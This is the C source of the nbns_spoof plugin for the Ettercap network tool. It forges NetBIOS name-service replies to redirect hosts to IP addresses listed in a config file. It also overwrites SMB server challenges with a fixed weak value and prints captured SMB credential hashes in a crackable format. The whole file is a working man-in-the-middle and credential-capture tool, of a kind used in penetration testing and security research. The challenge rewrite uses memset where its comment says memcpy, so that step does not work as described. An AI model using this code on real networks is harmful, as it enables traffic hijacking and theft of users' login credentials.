/*
    nbns_spoof -- ettercap plugin -- spoofs NBNS replies

    Copyright (C) Ettercap team
    
    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.

*/

#include <ec.h>                        /* required for global variables */
#include <ec_dissect.h>
#include <ec_plugins.h>                /* required for plugin ops */
#include <ec_file.h>
#include <ec_hook.h>
#include <ec_resolv.h>
#include <ec_send.h>

#include <stdlib.h>
#include <string.h>

#define TYPE_NB 0x0020
#define TYPE_NBSTAT 0x0021
#define CLASS_IN 0x0001

#define NBNS_NAME_LEN 34
#define NBNS_DECODED_NAME_LEN 16


/* From LWIP */

#define OPCODE_R 0x8000

/*OPCODE        1-4   Operation specifier:
                         0 = query
                         5 = registration
                         6 = release
                         7 = WACK
                         8 = refresh */

#define OPCODE_MASK             0x7800
#define OPCODE_QUERY            0x0000
#define OPCODE_REGISTRATION 0x2800
#define OPCODE_RELEASE          0x3000
#define OPCODE_WACK                     0x3800
#define OPCODE_REFRESH          0x4000
                                                 

/* NM_FLAGS subfield bits */ 
#define NM_AA_BIT         0x0400  /* Authoritative Answer */
#define NM_TR_BIT         0x0200  /* TRuncation flag      */
#define NM_RD_BIT         0x0100  /* Recursion Desired    */
#define NM_RA_BIT         0x0080  /* Recursion Available  */
#define NM_B_BIT          0x0010  /* Broadcast flag       */

/* Return Codes */
#define RCODE_POS_RSP     0x0000  /* Positive Response    */
#define RCODE_FMT_ERR     0x0001  /* Format Error         */
#define RCODE_SRV_ERR     0x0002  /* Server failure       */ 
#define RCODE_NAM_ERR     0x0003  /* Name Not Found       */ 
#define RCODE_IMP_ERR     0x0004  /* Unsupported request  */
#define RCODE_RFS_ERR     0x0005  /* Refused              */
#define RCODE_ACT_ERR     0x0006  /* Active error         */
#define RCODE_CFT_ERR     0x0007  /* Name in conflict     */
#define RCODE_MASK        0x0007  /* Mask                 */



struct nbns_header {
        u_int16 transactid;     /* Transaction ID */
#ifdef WORDS_BIGENDIAN
        u_char  response: 1;    /* response or query */
        u_char  opcode: 4;      /* opcode */
        /* nm_flags */
        u_char  aa: 1;
        u_char  tc: 1;
        u_char  rd: 1;
        u_char  ra: 1;
        u_char  unused: 2;
        u_char  broadcast: 1;
        u_char  rcode: 4;      /* RCODE */
#else
        u_char rd: 1;
        u_char tc: 1;
        u_char aa: 1;
        u_char opcode: 4;
        u_char response: 1;
        u_char rcode: 4;
        u_char broadcast: 1;
        u_char unused: 2;
        u_char ra: 1;
#endif
        u_int16 qd_count;       /* QDCOUNT */
        u_int16 an_count;       /* AN_COUNT */
        u_int16 ns_count;       /* NS_COUNT */
        u_int16 ar_count;       /* AR_COUNT */
};

/** NBNS rdata field */

struct nbns_rdata {
  u_int16 len;
  u_int16 nbflags;
  u_int32 addr;
};

#define NBNS_MSGLEN_QUERY_RESPONSE 70
#define NBNS_TTL_POS 12+1+NBNS_NAME_LEN+1+2+2
#define NBNS_RDATA_POS NBNS_TTL_POS + 2
#define NBNS_QUERY_POS 12

struct nbns_query {
	struct nbns_header header;
	char question[NBNS_NAME_LEN];
	u_int16 type;
	u_int16 class;
};

struct nbns_response {
	struct nbns_header header;
	char rr_name[NBNS_NAME_LEN];	/* RR_NAME */
	u_int16 type;
	u_int16 class;
	u_int32 ttl;
	struct nbns_rdata rr_data;
};



struct nbns_spoof_entry {
	char *name;
	struct ip_addr ip; /* no ipv6 nbns */
	SLIST_ENTRY(nbns_spoof_entry) next;
};

static SLIST_HEAD(, nbns_spoof_entry) nbns_spoof_head;

/* 
 * SMB portion
 */

typedef struct {
   u_char  proto[4];
   u_char  cmd;
   u_char  err[4];
   u_char  flags1;
   u_short flags2;
   u_short pad[6];
   u_short tid, pid, uid, mid;
} SMB_header;

typedef struct {
   u_char  mesg;
   u_char  flags;
   u_short len;
} NetBIOS_header;

#define IF_IN_PCK(x,y) if((x) >= y->packet && (x) < (y->packet + y->len) )


/* protos */
int plugin_load(void *);
static int nbns_spoof_init(void *);
static int nbns_spoof_fini(void *);
static int load_db(void);
static void nbns_spoof(struct packet_object *po);
static void nbns_set_challenge(struct packet_object *po);
static void nbns_print_jripper(struct packet_object *po);
static int parse_line(const char *str, int line, char **ip_p, char **name_p);
static int nbns_expand(char *compressed, char *dst);
static int get_spoofed_nbns(const char *a, struct ip_addr **ip);
static void nbns_spoof_dump(void);

struct plugin_ops nbns_spoof_ops = {
	/* ettercap version must be the global EC_VERSION */
	.ettercap_version =  	EC_VERSION,
	.name = 			"nbns_spoof",
	.info = 			"Sends spoof NBNS replies & sends SMB challenges with custom challenge",
	.version = 			"1.1",
	.init = 			&nbns_spoof_init,
	.fini = 			&nbns_spoof_fini,	
};

int plugin_load(void *handle)
{
	if (load_db() != ESUCCESS)
		return -EINVALID;

	nbns_spoof_dump();
	return plugin_register(handle, &nbns_spoof_ops);
}

static int nbns_spoof_init(void *dummy)
{
	/*
	 * add the hook in the dissector
	 * this will pass only valid NBNS packets
  	 */
	hook_add(HOOK_PROTO_NBNS, &nbns_spoof);
	hook_add(HOOK_PROTO_SMB, &nbns_set_challenge);
	hook_add(HOOK_PROTO_SMB_CMPLT, &nbns_print_jripper);
	return PLUGIN_RUNNING;
}

static int nbns_spoof_fini(void *dummy)
{
	hook_del(HOOK_PROTO_NBNS, &nbns_spoof);
	return PLUGIN_FINISHED;
}

/* load database */
static int load_db(void)
{
	struct nbns_spoof_entry *d;
	struct in_addr ipaddr;
	FILE *f;
	char line[128];
	char *ptr, *ip, *name;
	int lines = 0;

	f = open_data("etc", ETTER_NBNS, FOPEN_READ_TEXT);

	if (f == NULL) {
		USER_MSG("Cannot open %s\n", ETTER_NBNS); return -EINVALID;
	}
	
	while (fgets(line, 128, f)) {
		/* count lines */
		lines++;
		if ((ptr = strchr(line, '#')))
			*ptr = '\0';


		/* skip empty lines */
		if (!*line || *line == '\r' || *line == '\n')
			continue;

		/* strip apart the line */
		if (!parse_line(line, lines, &ip, &name))
			continue;

		if (inet_aton(ip, &ipaddr) == 0) {
			USER_MSG("%s:%d Invalid IP addres\n", ETTER_NBNS, lines);
			continue;
		}

		/* create the entry */
		SAFE_CALLOC(d, 1, sizeof(struct nbns_spoof_entry));
		
		ip_addr_init(&d->ip, AF_INET, (u_char *)&ipaddr);
		d->name = strdup(name);
	
		/* insert to list */
		SLIST_INSERT_HEAD(&nbns_spoof_head, d, next);
	}

	fclose(f);	
	return ESUCCESS;
}	

/*
 * Parse line on format "<name> <IP-addr>".
 */
static int parse_line(const char *str, int line, char **ip_p, char **name_p)
{
	static char name[100+1];
	static char ip[20+1];
	
	if(sscanf(str, "%100s %20[^\r\n# ]", name, ip) != 2) {
		USER_MSG("%s:%d Invalid entry %s\n", ETTER_NBNS, line, str);
		return(0);
	}

	if (strchr(ip, ':')) {
		USER_MSG("%s:%d IP address must be IPv4\n", ETTER_NBNS, line);
		return(0);
	}
	
	*name_p = name;
	*ip_p = ip;
	return (1);
}

/*
 * HOOK_POINT SMB
 * Change the challenge sent by the server to something
 * simple that can be decoded by other tools
 */

static void nbns_set_challenge(struct packet_object *po)
{
	u_char *ptr;
	SMB_header *smb;
	NetBIOS_header *NetBIOS;
	
	ptr = po->DATA.data;
	u_int64 SMB_WEAK_CHALLENGE = 0x1122334455667788;

	NetBIOS = (NetBIOS_header *)ptr;
	smb = (SMB_header *)(NetBIOS + 1);

	/* move to data */
	ptr = (u_char *)(smb + 1);

	if (memcmp(smb->proto, "\xffSMB", 4) != 0)
		return;

	if (smb->cmd == 0x72 && FROM_SERVER("smb", po)) {
		if (ptr[3] & 2) {
			/* Check encryption key len */
			if (*ptr != 0) {
				ptr += 3; /* Go to BLOB */
				//memcpy new challenge (8 bytes) to ptr
				memset(ptr, (long)SMB_WEAK_CHALLENGE, 8);
				po->flags |= PO_MODIFIED; /* calculate checksum */
				USER_MSG("nbns_spoof: Modified SMB challenge\n");
			}
		}
	}
}

/*
 * Hook point HOOK_PROTO_SMB_CMPLT
 * receives a packet_object with the
 * SMB username, password, challenge, etc.
 */
static void nbns_print_jripper(struct packet_object *po)
{
	//Domain = po->DISSECTOR.info
	//User = po->DISSECTOR.user
	//Pass = po->DISSECTOR.pass

	/*
         * Thanks to the SMB dissector, po->DISSECTOR.pass contains everything we need but domain
         */
	USER_MSG("%s%s\n", po->DISSECTOR.info, po->DISSECTOR.pass);
}

/* 
 * parse the packet and send the fake reply
 */
static void nbns_spoof(struct packet_object *po)
{
	struct nbns_query *nbns;
	struct nbns_header *header;
	char name[NBNS_DECODED_NAME_LEN];

	//header = (struct nbns_header *)po->DATA.data;
	nbns =  (struct nbns_query *)po->DATA.data;
	header = (struct nbns_header *)&nbns->header;

	if (header->response) {
		/* We only want queries */
		return;
	}

	if (ntohs(nbns->class) != CLASS_IN || ntohs(nbns->type) != TYPE_NB) {
		/* We only handle internet class and NB type */
		return;
	}


	memset(name, '\0', NBNS_DECODED_NAME_LEN);
	nbns_expand(nbns->question, name);

	struct ip_addr *reply;
	char tmp[MAX_ASCII_ADDR_LEN];

	if (get_spoofed_nbns(name, &reply) != ESUCCESS)
		return;

	u_char *response;

	SAFE_CALLOC(response, NBNS_MSGLEN_QUERY_RESPONSE, sizeof(u_char));

	memset(response, 0, NBNS_MSGLEN_QUERY_RESPONSE);

	memcpy(response, po->DATA.data, po->DATA.len);

	struct nbns_header *hdr = (struct nbns_header*)response;

	hdr->response = 1;
	hdr->opcode = ntohs(OPCODE_R+OPCODE_QUERY);
	hdr->rcode = ntohs(0);
	hdr->broadcast = ntohs(0);
	hdr->an_count = ntohs(1);
	hdr->qd_count = ntohs(0);
	hdr->ra = 0;
	hdr->rd = 0;
	hdr->tc = 0;
	hdr->aa = 1;
	hdr->ns_count = ntohs(0);
	hdr->ar_count = ntohs(0); 
	hdr->transactid = header->transactid;

	u_int16 *ttl1 = (u_int16*)(response+NBNS_TTL_POS);
	u_int16 *ttl2 = (u_int16*)(response+NBNS_TTL_POS+2);

	*ttl1 = ntohs(0);
	*ttl2 = ntohs(0);

	struct nbns_rdata *rdata = (struct nbns_rdata *) (response+NBNS_RDATA_POS);

	rdata->len = ntohs(2+sizeof(u_int32));
	rdata->nbflags = ntohs(0x0000);
	rdata->addr = ip_addr_to_int32(reply->addr);
	
	/* send fake reply */
	send_udp(&GBL_IFACE->ip, &po->L3.src, po->L2.src, po->L4.dst, po->L4.src, response, NBNS_MSGLEN_QUERY_RESPONSE);
	USER_MSG("nbns_spoof: Query [%s] spoofed to [%s]\n", name, ip_addr_ntoa(reply, tmp));

	/* Do not forward request */
	po->flags |= PO_DROPPED;

	SAFE_FREE(response);
	
}


/*
 * return the ip address for the name
 */
static int get_spoofed_nbns(const char *a, struct ip_addr **ip)
{
	struct nbns_spoof_entry *n;

	SLIST_FOREACH(n, &nbns_spoof_head, next) {
		if (match_pattern(a, n->name)) {
			*ip = &n->ip;
			return ESUCCESS;
		}
	}

	return -ENOTFOUND;
}

static void nbns_spoof_dump(void)
{
	struct nbns_spoof_entry *n;
	DEBUG_MSG("nbns_spoof entries:");
	SLIST_FOREACH(n, &nbns_spoof_head, next) {
		if(ntohs(n->ip.addr_type) == AF_INET)
      {
			DEBUG_MSG(" %s -> [%s]", n->name, int_ntoa(n->ip.addr));
      }
	}
}

static int nbns_expand(char *compressed, char *dst)
{
        //format <space>compressed\00
        int len = 0;
        int x=0;
        char j, k;


        for(len = 1; x < NBNS_NAME_LEN; len+=2){
                j = (compressed[len] & 0x3f)-1;
                k = (compressed[len+1] & 0x3f)-1;
                dst[x/2] = (j<<4)+(k);
                x+=2;
        }

	char *s = strstr(dst, " ");

	if (s)
		*s = '\0';
        return len;

}


// vim:ts=3:expandtab
